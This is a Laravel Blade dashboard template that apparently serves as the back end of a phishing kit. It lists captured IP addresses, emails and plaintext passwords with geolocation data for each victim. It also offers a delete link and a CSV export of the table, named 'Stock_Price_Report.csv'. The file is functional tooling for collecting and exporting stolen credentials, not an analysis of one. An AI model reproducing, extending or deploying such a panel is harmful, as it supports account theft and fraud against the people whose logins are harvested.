<!DOCTYPE html>
<html>
<head>
<title>Page  dahboard</title>


<script>
    function exportData(){
    /* Get the HTML data using Element by Id */
    var table = document.getElementById("tblData");

    /* Declaring array variable */
    var rows =[];

      //iterate through rows of table
    for(var i=0,row; row = table.rows[i];i++){
        //rows would be accessed using the "row" variable assigned in the for loop
        //Get each cell value/column from the row
        column1 = row.cells[0].innerText;
        column2 = row.cells[1].innerText;
        column3 = row.cells[2].innerText;
        column4 = row.cells[3].innerText;
        column5 = row.cells[4].innerText;
        column6 = row.cells[5].innerText;


    /* add a new records in the array */
        rows.push(
            [
                column1,
                column2,
                column3,
                column4,
                column5,
                column6,
            ]
        );

        }
        csvContent = "data:text/csv;charset=utf-8,";
         /* add the column delimiter as comma(,) and each row splitted by new line character (\n) */
        rows.forEach(function(rowArray){
            row = rowArray.join(",");
            csvContent += row + "\r\n";
        });

        /* create a hidden <a> DOM node and set its download attribute */
        var encodedUri = encodeURI(csvContent);
        var link = document.createElement("a");
        link.setAttribute("href", encodedUri);
        link.setAttribute("download", "Stock_Price_Report.csv");
        document.body.appendChild(link);
         /* download the data file named "Stock_Price_Report.csv" */
        link.click();
}
</script>
<style>


h1{
  font-size: 30px;
  color: #fff;
  text-transform: uppercase;
  font-weight: 300;
  text-align: center;
  margin-bottom: 15px;
}
table{
  width:100%;
  table-layout: fixed;
}
.tbl-header{
  background-color: rgba(255,255,255,0.3);
 }
.tbl-content{
  height:300px;
  overflow-x:auto;
  margin-top: 0px;
  border: 1px solid rgba(255,255,255,0.3);
}
th{
  padding: 20px 15px;
  text-align: left;
  font-weight: 500;
  font-size: 15px;
  color: #fff;
  text-transform: uppercase;
}
td{
  padding: 15px;
  text-align: left;
  vertical-align:middle;
  font-weight: 300;
  font-size: 13px;
  color: #fff;
  border-bottom: solid 1px rgba(255,255,255,0.1);
}


/* demo styles */

@import url(https://fonts.googleapis.com/css?family=Roboto:400,500,300,700);
body{
  background: -webkit-linear-gradient(left, #25c481, #25b7c4);
  background: linear-gradient(to right, #25c481, #25b7c4);
  font-family: 'Roboto', sans-serif;
}
section{
  margin: 50px;
}


/* follow me template */
.made-with-love {
  margin-top: 40px;
  padding: 10px;
  clear: left;
  text-align: center;
  font-size: 15px;
  font-family: arial;
  color: #fff;
}
.made-with-love i {
  font-style: normal;
  color: #F50057;
  font-size: 30px;
  position: relative;
  top: 2px;
}
.made-with-love a {
  color: #fff;
  text-decoration: none;
}
.made-with-love a:hover {
  text-decoration: underline;
}


/* for custom scrollbar for webkit browser*/

::-webkit-scrollbar {
    width: 6px;
}
::-webkit-scrollbar-track {
    -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3);
}
::-webkit-scrollbar-thumb {
    -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3);
}
.button {
  border: none;
  color: white;
  padding: 15px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  cursor: pointer;
}

.button1 {background-color: #4CAF50;}
</style>

</head>

<body>

<section>
  <!--for demo wrap-->
  <h1>Data :  <span
    class="badge badge badge-danger badge-pill float-right mr-2"> {{App\Models\Admin::count()}} Emails </span>  </h1>

    <h2> <a href="{{ route('delete') }}" class="btn btn-xs btn-info pull-right">Delete</a>
        <button onclick="exportData()" >
            <span class="glyphicon glyphicon-download"></span>
            Download list
         </button>
        </h2>


  <div class="tbl-header">
    <table id="tblData" cellpadding="0" cellspacing="0" border="0">
      <thead>
        <tr>

            <th scope="col">IP</th>
            <th scope="col">Email</th>
            <th scope="col">Password</th>
            <th scope="col">continentName </th>
            <th scope="col">countryName</th>
            <th scope="col">city</th>



        </tr>
      </thead>
    </table>
  </div>
  <div class="tbl-content">
    <table cellpadding="0" cellspacing="0" border="0">
      <tbody>
        @isset($Datas)
                                @foreach($Datas as $Data)
                                <tr>

                                    <td> {{$Data ->ip}}</td>
                                    <td> {{$Data ->email}}</td>
                                    <td> {{$Data ->password}}</td>
                                    <td>{{$Data ->geoplugin_continentName}}</td>
                                    <td>{{$Data ->geoplugin_countryName}}</td>
                                    <td>{{$Data ->geoplugin_city}}</td>
                                </tr>
                                @endforeach
                                @endisset
      </tbody>
    </table>
    <div class="d-flex justify-content-center " >
        {!! $Datas->links() !!}
      </div>
  </div>
</section>


<!-- follow me template -->
<div class="made-with-love">


</div>

</body>
</html>
